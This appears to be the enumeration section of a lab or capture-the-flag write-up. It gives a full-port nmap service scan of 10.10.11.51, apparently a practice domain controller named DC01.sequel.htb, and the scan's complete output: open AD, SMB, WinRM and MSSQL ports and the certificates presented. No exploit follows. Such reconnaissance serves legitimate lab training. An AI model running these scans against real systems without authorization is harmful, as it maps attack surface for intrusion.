# Enumeration 
```
sudo nmap -sC -sV -vvv -Pn --min-rate 20000 --stats-every 50s -p- 10.10.11.51
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-24 23:41 CDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:41
Completed NSE at 23:41, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:41
Completed NSE at 23:41, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:41
Completed NSE at 23:41, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 23:41
Completed Parallel DNS resolution of 1 host. at 23:41, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 23:41
Scanning 10.10.11.51 [65535 ports]
Discovered open port 135/tcp on 10.10.11.51
Discovered open port 139/tcp on 10.10.11.51
Discovered open port 53/tcp on 10.10.11.51
Discovered open port 445/tcp on 10.10.11.51
Discovered open port 49666/tcp on 10.10.11.51
Discovered open port 49667/tcp on 10.10.11.51
Discovered open port 5985/tcp on 10.10.11.51
Discovered open port 49722/tcp on 10.10.11.51
Discovered open port 49799/tcp on 10.10.11.51
Discovered open port 593/tcp on 10.10.11.51
Discovered open port 49706/tcp on 10.10.11.51
Discovered open port 49664/tcp on 10.10.11.51
Discovered open port 49743/tcp on 10.10.11.51
Discovered open port 49693/tcp on 10.10.11.51
Discovered open port 389/tcp on 10.10.11.51
Discovered open port 47001/tcp on 10.10.11.51
Discovered open port 49665/tcp on 10.10.11.51
Discovered open port 49690/tcp on 10.10.11.51
Discovered open port 3269/tcp on 10.10.11.51
Discovered open port 49689/tcp on 10.10.11.51
Discovered open port 1433/tcp on 10.10.11.51
Discovered open port 464/tcp on 10.10.11.51
Discovered open port 9389/tcp on 10.10.11.51
Discovered open port 636/tcp on 10.10.11.51
Discovered open port 88/tcp on 10.10.11.51
Discovered open port 3268/tcp on 10.10.11.51
Completed SYN Stealth Scan at 23:41, 6.92s elapsed (65535 total ports)
Initiating Service scan at 23:41
Scanning 26 services on 10.10.11.51
Stats: 0:00:53 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 57.69% done; ETC: 23:43 (0:00:33 remaining)
Completed Service scan at 23:42, 63.36s elapsed (26 services on 1 host)
NSE: Script scanning 10.10.11.51.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:42
Stats: 0:01:40 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE: Active NSE Script Threads: 1 (1 waiting)
NSE Timing: About 99.97% done; ETC: 23:43 (0:00:00 remaining)
Completed NSE at 23:43, 40.09s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:43
Completed NSE at 23:43, 6.74s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:43
Completed NSE at 23:43, 0.00s elapsed
Nmap scan report for 10.10.11.51
Host is up, received user-set (0.20s latency).
Scanned at 2025-04-24 23:41:45 CDT for 117s
Not shown: 65509 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-25 04:40:55Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
|_ssl-date: 2025-04-25T04:42:32+00:00; -1m04s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-25T04:42:32+00:00; -1m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-04-25T04:42:32+00:00; -1m04s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-23T13:23:15
| Not valid after:  2055-04-23T13:23:15
| MD5:   8961:a12e:0cc1:2f39:f30d:14e0:a86f:f6df
| SHA-1: 11cf:916b:4a0e:8b83:607c:b4a5:b825:cb96:7d49:a705
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQaawijrUxO4RKae5j+/3IvjANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjUwNDIzMTMyMzE1WhgPMjA1NTA0MjMxMzIzMTVaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKwEx6TT
| 1ySvuDvs/462iLL2kzWAH6nm4d3Q0MEZUHkZ4yBMNUiG5f0DC0pR6AaRKdMkC2OF
| +Y+eIjAYmgk90nhBXyJeYim4g3q3hNZvF1kWu31w8gTw8CkHly5ESyKYlMvi1vwy
| +dZyT035ph10HsmfrRQd7zK0fHnkY5SAuohPdqK0v32hd5PHWDYvhvPYLSCVxyxt
| JN6CGZp47ogIpX9ABY5C0uyCTb40FdcrMv3er2q4aq+TtDRVdc5QjpK477lNAS3z
| 16tRYOr6mqvLAdI/dX2WdI9irEwzW7kVQFTaP2WUcBSrqaezyS9m1sR4zy+m0EEo
| bMFz6SUEhFdp9vkCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAkiMl/OY5b6wD5+/d
| P3R8QmUuEBx96oSwUsDNC/88ahsny+3PFMEplSwuK+2utUacnPT6w+grD8UR3OM6
| GQAvk4Woc8RU2PkNOYc0xy88H7WI7ZobwaFkmydR8CbN44mxdTQoiRon+57PWgwn
| B9P8plPWBaAS8+kjiD9Bit5vh5pxuakmVG+EAKorHoFcbxWP6oU6U/mHcyWgeMIL
| WcW0q6ilwFhIIoaaGcxLLc1dNYrti2WXe70ZBnc3X1wiAL+F18CsgTZopDNikiu8
| o3MjYPjHUGNugAgbmDtXcGNQeDCQD283oUtHN6NMM3GVF0RDTV8f4Ag6ZdIqnv54
| RyUXag==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
|_ssl-date: 2025-04-25T04:42:32+00:00; -1m04s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
|_ssl-date: 2025-04-25T04:42:32+00:00; -1m03s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49706/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49722/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49743/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49799/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1m03s, deviation: 0s, median: -1m03s
| smb2-time: 
|   date: 2025-04-25T04:41:56
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62012/tcp): CLEAN (Timeout)
|   Check 2 (port 9228/tcp): CLEAN (Timeout)
|   Check 3 (port 20179/udp): CLEAN (Timeout)
|   Check 4 (port 21790/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:43
Completed NSE at 23:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:43
Completed NSE at 23:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:43
Completed NSE at 23:43, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.35 seconds
           Raw packets sent: 131044 (5.766MB) | Rcvd: 37 (2.004KB)
